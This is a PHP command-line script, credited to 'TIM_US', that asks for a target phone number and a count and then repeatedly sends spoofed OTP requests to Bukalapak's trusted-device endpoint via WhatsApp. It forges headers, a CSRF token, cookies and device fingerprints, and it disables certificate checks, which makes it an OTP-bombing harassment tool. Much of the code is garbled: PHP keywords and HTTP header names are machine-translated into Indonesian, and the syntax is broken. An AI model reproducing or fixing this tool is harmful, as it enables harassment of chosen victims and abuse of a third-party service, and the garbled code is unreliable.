<?php
echo  "HAK CIPTA :TIM_US\n\n" ;
echo  "Target Nomor?\nMasukan : " ;
$ nomer = trim ( fgets ( STDIN ));
if ( strlen ( $ nomer )== 11 ){
	$ nomer = str_replace ( "0" , "62" . $ nomer );
} elseif ( strlen ( $ nomer )> 12 ){
	$ nomer = str_replace ( "62" , "0" , $ nomer );
}
echo  "Target: $nomer (y/t)" ;
$ cek = trim ( fgets ( STDIN ));
if ( $ cek == "n" ) exit ( "Berhenti!\n" );
echo  "Jumlah?\nMasukan : " ;
$ jumlah = trim ( fgets ( STDIN ));
for( $ a = 0 ; $ a < $ jumlah ; $ a ++++) {
	$ rand1 = md5 ( rand ( 12345678 , 98765432 ));
	$ rand2 = md5 ( rand ( 12345678 , 98765432 ));
	$ rand = array ( $ rand1 , $ rand2 );
	$ rand3 = md5 ( $ rand [ rand ( 1 , 2 )]);
	$ config [ 'headers' ] = meledak ( "\n" , "Host: m.bukalapak.com
Koneksi: tetap hidup
Konten-Panjang: 134
Asal: https://m.bukalapak.com
Token X-CSRF: uYUfi93g92mZboBVB4UMwYInorBNOgyYEAbPUTikHht+xseF8BFUgg9qSgQWA9MRy7eL8G/SnbYUGg0JRM1fjw==
Agen-Pengguna: VntaHurted (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded; rangkaian karakter = UTF-8
Terima: */*
X-Diminta-Dengan: XMLHttpRequest
Simpan-Data: aktif
Referer: https://m.bukalapak.com/register?from=home_mobile
Terima-Encoding: gzip, deflate, br
Terima-Bahasa: en-US,en;q=0.9,id;q=0.8
Kuki: identitas=" . $ rand1 . "; browser_id=" . $ rand2 .lskjfewjrh34ghj23brjh234 = elBsSkNBb3VKS3hzZSttTnNKTm5VNk1pWmtzV1A1YldKRm1majAzRFdsSUJtcDJJV0psL0pnOFlBamtJU1NBa1Y2czlQdjZrNlFURDNiRmZqQmNRRXRyeWRTbGV5QUdpQnZjV3JocEc3ak9QeHpWSlpRNTE4eFgzR2FieDVnc2dWaUVoZzVzMEJlMVZwM2NKWk1LaXVwQTZuOXBVR01TUUJ4ejc4MW5MTU5taGYwZ2M0bFdwM05KYy9IcTh3bThsd3dzbSt4bHd4WG9NSklrcHJtT0dHUURURVQ5YVoyb0hLQ3dyUC9NZ2V6UUNFYmVGbE84REtqOHZlKzBZUGtiRS0tV3pMamNPNDhKT1FoZ202Q1BkNUJ5dz09--5a445aefe0c06b736c22e9f359ee3b7273058175; insdrSV=32; _td=7e03facb-a77c-4ce7-8b83-2427781c78c7");
	global  $ konfigurasi ;
	$ ar = http_build_query ( larik (
				'fitur' => 'pendaftaran_telepon' ,
				'feature_tag' => '' ,
				'manual_phone' => $ nomer ,
				'device_fingerprint' => $ rand3 ,
				'saluran' => 'WhatsApp'
                             )
                           );
	$ ch = curl_init ();
	curl_setopt ( $ ch , CURLOPT_URL , "https://m.bukalapak.com/trusted_devices/otp_request" );
	curl_setopt ( $ ch , CURLOPT_SSL_VERIFYPEER , false );
	curl_setopt ( $ ch , CURLOPT_FOLLOWLOCATION , benar );
	curl_setopt ( $ ch , CURLOPT_RETURNTRANSFER , benar );
	curl_setopt ( $ ch , CURLOPT_HEADER , false );
	curl_setopt ( $ ch , CURLOPT_HTTPHEADER , $ config [ 'headers' ]);
	curl_setopt ( $ ch , CURLOPT_POST , 1 );
	curl_setopt ( $ ch , CURLOPT_POSTFIELDS , $ ar );
	$ asw = curl_exec ( $ ch );
	curl_close ( $ ch );
	cetak $ a . $ nomer . " [Mengirim]\n" ;
}